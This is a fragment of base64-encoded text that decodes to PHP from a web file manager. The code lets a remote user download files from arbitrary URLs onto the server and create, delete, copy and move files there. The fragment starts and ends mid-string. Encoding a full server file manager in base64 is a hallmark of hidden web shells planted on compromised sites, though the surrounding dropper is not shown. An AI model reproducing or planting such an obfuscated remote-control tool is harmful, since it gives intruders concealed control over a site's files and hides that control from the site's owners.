ZpbGVzID0gJHNoZjsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJGNmZy0+ZGF0YVsnaGlkZV9Db2xzJ10gIT0gJGhjbykgew0KICAgICAgICAgICAgJGNmZy0+ZGF0YVsnaGlkZV9Db2xzJ10gPSAkaGNvOw0KICAgICAgICAgICAgJGhpZGVfQ29scyA9ICRoY287DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRjZmctPmRhdGFbJ3RoZW1lJ10gIT0gJHRlMykgew0KICAgICAgICAgICAgJGNmZy0+ZGF0YVsndGhlbWUnXSA9ICR0ZTM7DQogICAgICAgICAgICAkdGhlbWUgPSAkdGUzOw0KICAgICAgICB9DQogICAgICAgICRjZmctPnNhdmUoKTsNCiAgICAgICAgZWNobyB0cnVlOw0KICAgIH0NCg0KICAgIC8vIG5ldyBwYXNzd29yZCBoYXNoDQogICAgaWYgKGlzc2V0KCRfUE9TVFsndHlwZSddKSAmJiAkX1BPU1RbJ3R5cGUnXSA9PSAicHdkaGFzaCIpIHsNCiAgICAgICAgJHJlcyA9IGlzc2V0KCRfUE9TVFsnaW5wdXRQYXNzd29yZDInXSkgJiYgIWVtcHR5KCRfUE9TVFsnaW5wdXRQYXNzd29yZDInXSkgPyBwYXNzd29yZF9oYXNoKCRfUE9TVFsnaW5wdXRQYXNzd29yZDInXSwgUEFTU1dPUkRfREVGQVVMVCkgOiAnJzsNCiAgICAgICAgZWNobyAkcmVzOw0KICAgIH0NCg0KICAgIC8vdXBsb2FkIHVzaW5nIHVybA0KICAgIGlmIChpc3NldCgkX1BPU1RbJ3R5cGUnXSkgJiYgJF9QT1NUWyd0eXBlJ10gPT0gInVwbG9hZCIgJiYgIWVtcHR5KCRfUkVRVUVTVFsidXBsb2FkdXJsIl0pKSB7DQogICAgICAgICRwYXRoID0gRk1fUk9PVF9QQVRIOw0KICAgICAgICBpZiAoRk1fUEFUSCAhPSAnJykgew0KICAgICAgICAgICAgJHBhdGggLj0gJy8nIC4gRk1fUEFUSDsNCiAgICAgICAgfQ0KDQogICAgICAgIGZ1bmN0aW9uIGV2ZW50X2NhbGxiYWNrKCRtZXNzYWdlKQ0KICAgICAgICB7DQogICAgICAgICAgICBnbG9iYWwgJGNhbGxiYWNrOw0KICAgICAgICAgICAgZWNobyBqc29uX2VuY29kZSgkbWVzc2FnZSk7DQogICAgICAgIH0NCg0KICAgICAgICBmdW5jdGlvbiBnZXRfZmlsZV9wYXRoKCkNCiAgICAgICAgew0KICAgICAgICAgICAgZ2xvYmFsICRwYXRoLCAkZmlsZWluZm8sICR0ZW1wX2ZpbGU7DQogICAgICAgICAgICByZXR1cm4gJHBhdGggLiAiLyIgLiBiYXNlbmFtZSgkZmlsZWluZm8tPm5hbWUpOw0KICAgICAgICB9DQoNCiAgICAgICAgJHVybCA9ICFlbXB0eSgkX1JFUVVFU1RbInVwbG9hZHVybCJdKSAmJiBwcmVnX21hdGNoKCJ8Xmh0dHAocyk/Oi8vLiskfCIsIHN0cmlwc2xhc2hlcygkX1JFUVVFU1RbInVwbG9hZHVybCJdKSkgPyBzdHJpcHNsYXNoZXMoJF9SRVFVRVNUWyJ1cGxvYWR1cmwiXSkgOiBudWxsOw0KDQogICAgICAgIC8vcHJldmVudCAxMjcuKiBkb21haW4gYW5kIGtub3duIHBvcnRzDQogICAgICAgICRkb21haW4gPSBwYXJzZV91cmwoJHVybCwgUEhQX1VSTF9IT1NUKTsNCiAgICAgICAgJHBvcnQgPSBwYXJzZV91cmwoJHVybCwgUEhQX1VSTF9QT1JUKTsNCiAgICAgICAgJGtub3duUG9ydHMgPSBbMjIsIDIzLCAyNSwgMzMwNl07DQoNCiAgICAgICAgaWYgKHByZWdfbWF0Y2goIi9ebG9jYWxob3N0JHxeMTI3KD86XC5bMC05XSspezAsMn1cLlswLTldKyR8Xig/OjAqXDopKj86PzAqMSQvaSIsICRkb21haW4pIHx8IGluX2FycmF5KCRwb3J0LCAka25vd25Qb3J0cykpIHsNCiAgICAgICAgICAgICRlcnIgPSBhcnJheSgibWVzc2FnZSIgPT4gIlVSTCBpcyBub3QgYWxsb3dlZCIpOw0KICAgICAgICAgICAgZXZlbnRfY2FsbGJhY2soYXJyYXkoImZhaWwiID0+ICRlcnIpKTsNCiAgICAgICAgICAgIGV4aXQoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICR1c2VfY3VybCA9IGZhbHNlOw0KICAgICAgICAkdGVtcF9maWxlID0gdGVtcG5hbShzeXNfZ2V0X3RlbXBfZGlyKCksICJ1cGxvYWQtIik7DQogICAgICAgICRmaWxlaW5mbyA9IG5ldyBzdGRDbGFzcygpOw0KICAgICAgICAkZmlsZWluZm8tPm5hbWUgPSB0cmltKHVybGRlY29kZShiYXNlbmFtZSgkdXJsKSksICIuXHgwMC4uXHgyMCIpOw0KDQogICAgICAgICRhbGxvd2VkID0gKEZNX1VQTE9BRF9FWFRFTlNJT04pID8gZXhwbG9kZSgnLCcsIEZNX1VQTE9BRF9FWFRFTlNJT04pIDogZmFsc2U7DQogICAgICAgICRleHQgPSBzdHJ0b2xvd2VyKHBhdGhpbmZvKCRmaWxlaW5mby0+bmFtZSwgUEFUSElORk9fRVhURU5TSU9OKSk7DQogICAgICAgICRpc0ZpbGVBbGxvd2VkID0gKCRhbGxvd2VkKSA/IGluX2FycmF5KCRleHQsICRhbGxvd2VkKSA6IHRydWU7DQoNCiAgICAgICAgJGVyciA9IGZhbHNlOw0KDQogICAgICAgIGlmICghJGlzRmlsZUFsbG93ZWQpIHsNCiAgICAgICAgICAgICRlcnIgPSBhcnJheSgibWVzc2FnZSIgPT4gIkZpbGUgZXh0ZW5zaW9uIGlzIG5vdCBhbGxvd2VkIik7DQogICAgICAgICAgICBldmVudF9jYWxsYmFjayhhcnJheSgiZmFpbCIgPT4gJGVycikpOw0KICAgICAgICAgICAgZXhpdCgpOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCEkdXJsKSB7DQogICAgICAgICAgICAkc3VjY2VzcyA9IGZhbHNlOw0KICAgICAgICB9IGVsc2UgaWYgKCR1c2VfY3VybCkgew0KICAgICAgICAgICAgQCRmcCA9IGZvcGVuKCR0ZW1wX2ZpbGUsICJ3Iik7DQogICAgICAgICAgICBAJGNoID0gY3VybF9pbml0KCR1cmwpOw0KICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX05PUFJPR1JFU1MsIGZhbHNlKTsNCiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgdHJ1ZSk7DQogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTsNCiAgICAgICAgICAgIEAkc3VjY2VzcyA9IGN1cmxfZXhlYygkY2gpOw0KICAgICAgICAgICAgJGN1cmxfaW5mbyA9IGN1cmxfZ2V0aW5mbygkY2gpOw0KICAgICAgICAgICAgaWYgKCEkc3VjY2Vzcykgew0KICAgICAgICAgICAgICAgICRlcnIgPSBhcnJheSgibWVzc2FnZSIgPT4gY3VybF9lcnJvcigkY2gpKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIEBjdXJsX2Nsb3NlKCRjaCk7DQogICAgICAgICAgICBmY2xvc2UoJGZwKTsNCiAgICAgICAgICAgICRmaWxlaW5mby0+c2l6ZSA9ICRjdXJsX2luZm9bInNpemVfZG93bmxvYWQiXTsNCiAgICAgICAgICAgICRmaWxlaW5mby0+dHlwZSA9ICRjdXJsX2luZm9bImNvbnRlbnRfdHlwZSJdOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJGN0eCA9IHN0cmVhbV9jb250ZXh0X2NyZWF0ZSgpOw0KICAgICAgICAgICAgQCRzdWNjZXNzID0gY29weSgkdXJsLCAkdGVtcF9maWxlLCAkY3R4KTsNCiAgICAgICAgICAgIGlmICghJHN1Y2Nlc3MpIHsNCiAgICAgICAgICAgICAgICAkZXJyID0gZXJyb3JfZ2V0X2xhc3QoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgkc3VjY2Vzcykgew0KICAgICAgICAgICAgJHN1Y2Nlc3MgPSByZW5hbWUoJHRlbXBfZmlsZSwgc3RydG9rKGdldF9maWxlX3BhdGgoKSwgJz8nKSk7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoJHN1Y2Nlc3MpIHsNCiAgICAgICAgICAgIGV2ZW50X2NhbGxiYWNrKGFycmF5KCJkb25lIiA9PiAkZmlsZWluZm8pKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHVubGluaygkdGVtcF9maWxlKTsNCiAgICAgICAgICAgIGlmICghJGVycikgew0KICAgICAgICAgICAgICAgICRlcnIgPSBhcnJheSgibWVzc2FnZSIgPT4gIkludmFsaWQgdXJsIHBhcmFtZXRlciIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZXZlbnRfY2FsbGJhY2soYXJyYXkoImZhaWwiID0+ICRlcnIpKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBleGl0KCk7DQp9DQoNCi8vIERlbGV0ZSBmaWxlIC8gZm9sZGVyDQppZiAoaXNzZXQoJF9HRVRbJ2RlbCddLCAkX1BPU1RbJ3Rva2VuJ10pICYmICFGTV9SRUFET05MWSkgew0KICAgICRkZWwgPSBzdHJfcmVwbGFjZSgnLycsICcnLCBmbV9jbGVhbl9wYXRoKCRfR0VUWydkZWwnXSkpOw0KICAgIGlmICgkZGVsICE9ICcnICYmICRkZWwgIT0gJy4uJyAmJiAkZGVsICE9ICcuJyAmJiB2ZXJpZnlUb2tlbigkX1BPU1RbJ3Rva2VuJ10pKSB7DQogICAgICAgICRwYXRoID0gRk1fUk9PVF9QQVRIOw0KICAgICAgICBpZiAoRk1fUEFUSCAhPSAnJykgew0KICAgICAgICAgICAgJHBhdGggLj0gJy8nIC4gRk1fUEFUSDsNCiAgICAgICAgfQ0KICAgICAgICAkaXNfZGlyID0gaXNfZGlyKCRwYXRoIC4gJy8nIC4gJGRlbCk7DQogICAgICAgIGlmIChmbV9yZGVsZXRlKCRwYXRoIC4gJy8nIC4gJGRlbCkpIHsNCiAgICAgICAgICAgICRtc2cgPSAkaXNfZGlyID8gbG5nKCdGb2xkZXInKSAuICcgPGI+JXM8L2I+ICcgLiBsbmcoJ0RlbGV0ZWQnKSA6IGxuZygnRmlsZScpIC4gJyA8Yj4lczwvYj4gJyAuIGxuZygnRGVsZXRlZCcpOw0KICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKCRtc2csIGZtX2VuYygkZGVsKSkpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJG1zZyA9ICRpc19kaXIgPyBsbmcoJ0ZvbGRlcicpIC4gJyA8Yj4lczwvYj4gJyAuIGxuZygnbm90IGRlbGV0ZWQnKSA6IGxuZygnRmlsZScpIC4gJyA8Yj4lczwvYj4gJyAuIGxuZygnbm90IGRlbGV0ZWQnKTsNCiAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZigkbXNnLCBmbV9lbmMoJGRlbCkpLCAnZXJyb3InKTsNCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdJbnZhbGlkIGZpbGUgb3IgZm9sZGVyIG5hbWUnKSwgJ2Vycm9yJyk7DQogICAgfQ0KICAgICRGTV9QQVRIID0gRk1fUEFUSDsNCiAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKCRGTV9QQVRIKSk7DQp9DQoNCi8vIENyZWF0ZSBhIG5ldyBmaWxlL2ZvbGRlcg0KaWYgKGlzc2V0KCRfUE9TVFsnbmV3ZmlsZW5hbWUnXSwgJF9QT1NUWyduZXdmaWxlJ10sICRfUE9TVFsndG9rZW4nXSkgJiYgIUZNX1JFQURPTkxZKSB7DQogICAgJHR5cGUgPSB1cmxkZWNvZGUoJF9QT1NUWyduZXdmaWxlJ10pOw0KICAgICRuZXcgPSBzdHJfcmVwbGFjZSgnLycsICcnLCBmbV9jbGVhbl9wYXRoKHN0cmlwX3RhZ3MoJF9QT1NUWyduZXdmaWxlbmFtZSddKSkpOw0KICAgIGlmIChmbV9pc3ZhbGlkX2ZpbGVuYW1lKCRuZXcpICYmICRuZXcgIT0gJycgJiYgJG5ldyAhPSAnLi4nICYmICRuZXcgIT0gJy4nICYmIHZlcmlmeVRva2VuKCRfUE9TVFsndG9rZW4nXSkpIHsNCiAgICAgICAgJHBhdGggPSBGTV9ST09UX1BBVEg7DQogICAgICAgIGlmIChGTV9QQVRIICE9ICcnKSB7DQogICAgICAgICAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdHlwZSA9PSAiZmlsZSIpIHsNCiAgICAgICAgICAgIGlmICghZmlsZV9leGlzdHMoJHBhdGggLiAnLycgLiAkbmV3KSkgew0KICAgICAgICAgICAgICAgIGlmIChmbV9pc192YWxpZF9leHQoJG5ldykpIHsNCiAgICAgICAgICAgICAgICAgICAgQGZvcGVuKCRwYXRoIC4gJy8nIC4gJG5ldywgJ3cnKSBvciBkaWUoJ0Nhbm5vdCBvcGVuIGZpbGU6ICAnIC4gJG5ldyk7DQogICAgICAgICAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZihsbmcoJ0ZpbGUnKSAuICcgPGI+JXM8L2I+ICcgLiBsbmcoJ0NyZWF0ZWQnKSwgZm1fZW5jKCRuZXcpKSk7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0ZpbGUgZXh0ZW5zaW9uIGlzIG5vdCBhbGxvd2VkJyksICdlcnJvcicpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKGxuZygnRmlsZScpIC4gJyA8Yj4lczwvYj4gJyAuIGxuZygnYWxyZWFkeSBleGlzdHMnKSwgZm1fZW5jKCRuZXcpKSwgJ2FsZXJ0Jyk7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpZiAoZm1fbWtkaXIoJHBhdGggLiAnLycgLiAkbmV3LCBmYWxzZSkgPT09IHRydWUpIHsNCiAgICAgICAgICAgICAgICBmbV9zZXRfbXNnKHNwcmludGYobG5nKCdGb2xkZXInKSAuICcgPGI+JXM8L2I+ICcgLiBsbmcoJ0NyZWF0ZWQnKSwgJG5ldykpOw0KICAgICAgICAgICAgfSBlbHNlaWYgKGZtX21rZGlyKCRwYXRoIC4gJy8nIC4gJG5ldywgZmFsc2UpID09PSAkcGF0aCAuICcvJyAuICRuZXcpIHsNCiAgICAgICAgICAgICAgICBmbV9zZXRfbXNnKHNwcmludGYobG5nKCdGb2xkZXInKSAuICcgPGI+JXM8L2I+ICcgLiBsbmcoJ2FscmVhZHkgZXhpc3RzJyksIGZtX2VuYygkbmV3KSksICdhbGVydCcpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBmbV9zZXRfbXNnKHNwcmludGYobG5nKCdGb2xkZXInKSAuICcgPGI+JXM8L2I+ICcgLiBsbmcoJ25vdCBjcmVhdGVkJyksIGZtX2VuYygkbmV3KSksICdlcnJvcicpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0ludmFsaWQgY2hhcmFjdGVycyBpbiBmaWxlIG9yIGZvbGRlciBuYW1lJyksICdlcnJvcicpOw0KICAgIH0NCiAgICAkRk1fUEFUSCA9IEZNX1BBVEg7DQogICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZSgkRk1fUEFUSCkpOw0KfQ0KDQovLyBDb3B5IGZvbGRlciAvIGZpbGUNCmlmIChpc3NldCgkX0dFVFsnY29weSddLCAkX0dFVFsnZmluaXNoJ10pICYmICFGTV9SRUFET05MWSkgew0KICAgIC8vIGZyb20NCiAgICAkY29weSA9IHVybGRlY29kZSgkX0dFVFsnY29weSddKTsNCiAgICAkY29weSA9IGZtX2NsZWFuX3BhdGgoJGNvcHkpOw0KICAgIC8vIGVtcHR5IHBhdGgNCiAgICBpZiAoJGNvcHkgPT0gJycpIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ1NvdXJjZSBwYXRoIG5vdCBkZWZpbmVkJyksICdlcnJvcicpOw0KICAgICAgICAkRk1fUEFUSCA9IEZNX1BBVEg7DQogICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCiAgICB9DQogICAgLy8gYWJzIHBhdGggZnJvbQ0KICAgICRmcm9tID0gRk1fUk9PVF9QQVRIIC4gJy8nIC4gJGNvcHk7DQogICAgLy8gYWJzIHBhdGggdG8NCiAgICAkZGVzdCA9IEZNX1JPT1RfUEFUSDsNCiAgICBpZiAoRk1fUEFUSCAhPSAnJykgew0KICAgICAgICAkZGVzdCAuPSAnLycgLiBGTV9QQVRIOw0KICAgIH0NCiAgICAkZGVzdCAuPSAnLycgLiBiYXNlbmFtZSgkZnJvbSk7DQogICAgLy8gbW92ZT8NCiAgICAkbW92ZSA9IGlzc2V0KCRfR0VUWydtb3ZlJ10pOw0KICAgICRtb3ZlID0gZm1fY2xlYW5fcGF0aCh1cmxkZWNvZGUoJG1vdmUpKTsNCiAgICAvLyBjb3B5L21vdmUvZHVwbGljYXRlDQogICAgaWYgKCRmcm9tICE9ICRkZXN0KSB7DQogICAgICAgICRtc2dfZnJvbSA9IHRyaW0oRk1fUEFUSCAuICcvJyAuIGJhc2VuYW1lKCRmcm9tKSwgJy8nKTsNCiAgICAgICAgaWYgKCRtb3ZlKSB7IC8vIE1vdmUgYW5kIHRvICE9IGZyb20gc28ganVzdCBwZXJmb3JtIG1vdmUNCiAgICAgICAgICAgICRyZW5hbWUgPSBmbV9yZW5hbWUoJGZyb20sICRkZXN0KTsNCiAgICAgICAgICAgIGlmICgkcmVuYW1lKSB7DQogICAgICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKGxuZygnTW92ZWQgZnJvbScpIC4gJyA8Yj4lczwvYj4gJyAuIGxuZygndG8nKSAuICcgPGI+JXM8L2I+JywgZm1fZW5jKCRjb3B5KSwgZm1fZW5jKCRtc2dfZnJvbSkpKTsNCiAgICAgICAgICAgIH0gZWxzZWlmICgkcmVuYW1lID09PSBudWxsKSB7DQogICAgICAgICAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0ZpbGUgb3IgZm9sZGVyIHdpdGggdGhpcyBwYXRoIGFscmVhZHkgZXhpc3RzJyksICdhbGVydCcpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBmbV9zZXRfbXNnKHNwcmludGYobG5nKCdFcnJvciB3aGlsZSBtb3ZpbmcgZnJvbScpIC4gJyA8Yj4lczwvYj4gJyAuIGxuZygndG8nKSAuICcgPGI+JXM8L2I+JywgZm1fZW5jKCRjb3B5KSwgZm1fZW5jKCRtc2dfZnJvbSkpLCAnZXJyb3InKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsgLy8gTm90IG1vdmUgYW5kIHRvICE9IGZyb20gc28gY29weSB3aXRoIG9yaWdpbmFsIG5hbWUNCiAgICAgICAgICAgIGlmIChmbV9yY29weSgkZnJvbSwgJGRlc3QpKSB7DQogICAgICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKGxuZygnQ29waWVkIGZyb20nKSAuICcgPGI+JXM8L2I+ICcgLiBsbmcoJ3RvJykgLiAnIDxiPiVzPC9iPicsIGZtX2VuYygkY29weSksIGZtX2VuYygkbXNnX2Zyb20pKSk7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZihsbmcoJ0Vycm9yIHdoaWxlIGNvcHlpbmcgZnJvbScpIC4gJyA8Yj4lczwvYj4gJyAuIGxuZygndG8nKSAuICcgPGI+JXM8L2I+JywgZm1fZW5jKCRjb3B5KSwgZm1fZW5jKCRtc2dfZnJvbSkpLCAnZXJyb3InKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgIGlmICghJG1vdmUpIHsgLy9Ob3QgbW92ZSBhbmQgdG8gPSBmcm9tIHNvIGR1cGxpY2F0ZQ0KICAgICAgICAgICAgJG1zZ19mcm9tID0gdHJpbShGTV9QQVRIIC4gJy8nIC4gYmFzZW5hbWUoJGZyb20pLCAnLycpOw0KICAgICAgICAgICAgJGZuX3BhcnRzID0gcGF0aGluZm8oJGZyb20pOw0KICAgICAgICAgICAgJGV4dGVuc2lvbl9zdWZmaXggPSAnJzsNCiAgICAgICAgICAgIGlmICghaXNfZGlyKCRmcm9tKSkgew0KICAgICAgICAgICAgICAgICRleHRlbnNpb25fc3VmZml4ID0gJy4nIC4gJGZuX3BhcnRzWydleHRlbnNpb24nXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIC8vQ3JlYXRlIG5ldyBuYW1lIGZvciBkdXBsaWNhdGUNCiAgICAgICAgICAgICRmbl9kdXBsaWNhdGUgPSAkZm5fcGFydHNbJ2Rpcm5hbWUnXSAuICcvJyAuICRmbl9wYXJ0c1snZmlsZW5hbWUnXSAuICctJyAuIGRhdGUoJ1ltZEhpcycpIC4gJGV4dGVuc2lvbl9zdWZmaXg7DQogICAgICAgICAgICAkbG9vcF9jb3VudCA9IDA7DQogICAgICAgICAgICAkbWF4X2xvb3AgPSAxMDAwOw0KICAgICAgICAgICAgLy8gQ2hlY2sgaWYgYSBmaWxlIHdpdGggdGhlIGR1cGxpY2F0ZSBuYW1lIGFscmVhZHkgZXhpc3RzLCBpZiBzbywgbWFrZSBuZXcgbmFtZSAoZWRnZSBjYXNlLi4uKQ0KICAgICAgICAgICAgd2hpbGUgKGZpbGVfZXhpc3RzKCRmbl9kdXBsaWNhdGUpICYgJGxvb3BfY291bnQgPCAkbWF4X2xvb3ApIHsNCiAgICAgICAgICAgICAgICAkZm5fcGFydHMgPSBwYXRoaW5mbygkZm5fZHVwbGljYXRlKTsNCiAgICAgICAgICAgICAgICAkZm5fZHVwbGljYXRlID0gJGZuX3BhcnRzWydkaXJuYW1lJ10gLiAnLycgLiAkZm5fcGFydHNbJ2ZpbGVuYW1lJ10gLiAnLWNvcHknIC4gJGV4dGVuc2lvbl9zdWZmaXg7DQogICAgICAgICAgICAgICAgJGxvb3BfY291bnQrKzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChmbV9yY29weSgkZnJvbSwgJGZuX2R1cGxpY2F0ZSwgRmFsc2UpKSB7DQogICAgICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKCdDb3BpZWQgZnJvbSA8Yj4lczwvYj4gdG8gPGI+JXM8L2I+JywgZm1fZW5jKCRjb3B5KSwgZm1fZW5jKCRmbl9kdXBsaWNhdGUpKSk7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZignRXJyb3Igd2hpbGUgY29weWluZyBmcm9tIDxiPiVzPC9iPiB0byA8Yj4lczwvYj4nLCBmbV9lbmMoJGNvcHkpLCBmbV9lbmMoJGZuX2R1cGxpY2F0ZSkpLCAnZXJyb3InKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGZtX3NldF9tc2cobG5nKCdQYXRocyBtdXN0IGJlIG5vdCBlcXVhbCcpLCAnYWxlcnQnKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICAkRk1fUEFUSCA9IEZNX1BBVEg7DQogICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZSgkRk1fUEFUSCkpOw0KfQ0KDQovLyBNYXNzIGNvcHkgZmlsZXMvIGZvbGRlcnMNCmlmIChpc3NldCgkX1BPU1RbJ2ZpbGUnXSwgJF9QT1NUWydjb3B5X3RvJ10sICRfUE9TVFsnZmluaXNoJ10sICRfUE9TVFsndG9rZW4nXSkgJiYgIUZNX1JFQURPTkxZKSB7DQoNCiAgICBpZiAoIXZlcmlmeVRva2VuKCRfUE9TVFsndG9rZW4nXSkpIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0ludmFsaWQgVG9rZW4uJyksICdlcnJvcicpOw0KICAgIH0NCg0KICAgIC8vIGZyb20NCiAgICAkcGF0aCA9IEZNX1JPT1RfUEFUSDsNCiAgICBpZiAoRk1fUEFUSCAhPSAnJykgew0KICAgICAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOw0KICAgIH0NCiAgICAvLyB0bw0KICAgICRjb3B5X3RvX3BhdGggPSBGTV9ST09UX1BBVEg7DQogICAgJGNvcHlfdG8gPSBmbV9jbGVhbl9wYXRoKCRfUE9TVFsnY29weV90byddKTsNCiAgICBpZiAoJGNvcHlfdG8gIT0gJycpIHsNCiAgICAgICAgJGNvcHlfdG9fcGF0aCAuPSAnLycgLiAkY29weV90bzsNCiAgICB9DQogICAgaWYgKCRwYXRoID09ICRjb3B5X3RvX3BhdGgpIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ1BhdGhzIG11c3QgYmUgbm90IGVxdWFsJyksICdhbGVydCcpOw0KICAgICAgICAkRk1fUEFUSCA9IEZNX1BBVEg7DQogICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCiAgICB9DQogICAgaWYgKCFpc19kaXIoJGNvcHlfdG9fcGF0aCkpIHsNCiAgICAgICAgaWYgKCFmbV9ta2RpcigkY29weV90b19wYXRoLCB0cnVlKSkgew0KICAgICAgICAgICAgZm1fc2V0X21zZygnVW5hYmxlIHRvIGNyZWF0ZSBkZXN0aW5hdGlvbiBmb2xkZXInLCAnZXJyb3InKTsNCiAgICAgICAgICAgICRGTV9QQVRIID0gRk1fUEFUSDsNCiAgICAgICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICAvLyBtb3ZlPw0KICAgICRtb3ZlID0gaXNzZXQoJF9QT1NUWydtb3ZlJ10pOw0KICAgIC8vIGNvcHkvbW92ZQ0KICAgICRlcnJvcnMgPSAwOw0KICAgICRmaWxlcyA9ICRfUE9TVFsnZmlsZSddOw0KICAgIGlmIChpc19hcnJheSgkZmlsZXMpICYmIGNvdW50KCRmaWxlcykpIHsNCiAgICAgICAgZm9yZWFjaCAoJGZpbGVzIGFzICRmKSB7DQogICAgICAgICAgICBpZiAoJGYgIT0gJycpIHsNCiAgICAgICAgICAgICAgICAkZiA9IGZtX2NsZWFuX3BhdGgoJGYpOw0KICAgICAgICAgICAgICAgIC8vIGFicyBwYXRoIGZyb20NCiAgICAgICAgICAgICAgICAkZnJvbSA9ICRwYXRoIC4gJy8nIC4gJGY7DQogICAgICAgICAgICAgICAgLy8gYWJzIHBhdGggdG8NCiAgICAgICAgICAgICAgICAkZGVzdCA9ICRjb3B5X3RvX3BhdGggLiAnLycgLiAkZjsNCiAgICAgICAgICAgICAgICAvLyBkbw0KICAgICAgICAgICAgICAgIGlmICgkbW92ZSkgew0KICAgICAgICAgICAgICAgICAgICAkcmVuYW1lID0gZm1fcmVuYW1lKCRmcm9tLCAkZGVzdCk7DQogICAgICAgICAgICAgICAgICAgIGlmICgkcmVuYW1lID09PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGVycm9ycysrOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCFmbV9yY29weSgkZnJvbSwgJGRlc3QpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkZXJyb3JzKys7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRlcnJvcnMgPT0gMCkgew0KICAgICAgICAgICAgJG1zZyA9ICRtb3ZlID8gJ1NlbGVjdGVkIGZpbGVzIGFuZCBmb2xkZXJzIG1vdmVkJyA6ICdTZWxlY3RlZCBmaWxlcyBhbmQgZm9sZGVycyBjb3BpZWQnOw0KICAgICAgICAgICAgZm1fc2V0X21zZygkbXNnKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRtc2cgPSAkbW92ZSA/ICdFcnJvciB3aGlsZSBtb3ZpbmcgaXRlbXMnIDogJ0Vycm9yIHdoaWxlIGNvcHlpbmcgaXRlbXMnOw0KICAgICAgICAgICAgZm1fc2V0X21zZygkbXNnLCAnZXJyb3InKTsNCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdOb3RoaW5nIHNlbGVjdGVkJyksICdhbGVydCcpOw0KICAgIH0NCiAgICAkRk1fUEFUSCA9IEZNX1BBVEg7DQogICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY2